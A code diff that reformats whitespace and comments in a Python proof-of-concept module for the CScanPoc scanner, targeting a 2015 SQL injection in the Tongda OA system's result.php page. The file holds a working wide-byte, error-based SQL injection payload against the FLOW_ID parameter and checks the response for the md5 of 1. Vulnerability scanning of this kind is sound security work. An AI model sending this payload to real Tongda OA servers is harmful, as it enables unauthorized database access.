@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'TongdaOA_0001' # 平台漏洞编号，留空
+    vuln_id = 'TongdaOA_0001'  # 平台漏洞编号，留空
     name = '通达OA系统 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-05-27'  # 漏洞公布时间
     desc = '''
         通达OA系统/general/score/flow/scoredate/result.php页面参数过滤不严谨，导致SQL注入漏洞。
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '通达OA系统'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'e23a62db-3243-4258-80f0-60719a6e070d'
@@ -30,12 +32,12 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #Refer http://www.wooyun.org/bugs/wooyun-2015-0116359
+
+            # Refer http://www.wooyun.org/bugs/wooyun-2015-0116359
             payload = '/general/score/flow/scoredate/result.php?FLOW_ID=11%bf%27%20and%20(SELECT%201%20from%20(select%20count(*),concat(floor(rand(0)*2),(substring((select%20md5(1)),1,62)))a%20from%20information_schema.tables%20group%20by%20a)b)%23'
             verify_url = self.target + payload
             req = requests.get(verify_url)
-            
+
             if req.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in req.content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -45,6 +47,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
